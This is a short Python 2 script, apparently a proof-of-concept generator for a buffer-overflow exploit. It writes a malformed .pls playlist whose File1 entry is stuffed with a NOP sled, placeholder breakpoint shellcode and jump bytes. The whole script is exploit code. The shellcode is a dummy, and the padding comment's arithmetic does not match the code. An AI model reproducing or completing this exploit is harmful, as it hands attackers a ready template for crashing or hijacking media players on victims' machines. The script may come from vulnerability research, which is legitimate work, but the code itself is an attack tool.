import sys

if len(sys.argv) <= 1:
    print "Usage: python " + sys.argv[0] + " [filename]"
    exit()

filename = sys.argv[1]

# Prefix
prefix = "[playlist]\r\nFile1=\\\\"

# Generate NOP's
nop = "\x90" * 856

# Shellcode
sc = "\xcc" * 166

# Jump around
jump = "\x41" * 4
jump += "\x83" * 8
jump += "\x90" * 4

# Suffix
suffix = "\r\nTitle1=pwnd\r\nLength1=512\r\nNumberOfEntries=1\r\nVersion=2\r\n"

# 2500 - 2006 - 4 - 8 - 351 = 131 left
# padding = "B" * (2500 - len(prefix) - len(jump) - len(nop) - len(payload))

# Concatenate string for sending
code = prefix + nop + sc + jump + suffix

f = open(filename, 'wb')
f.write(code)
f.close()
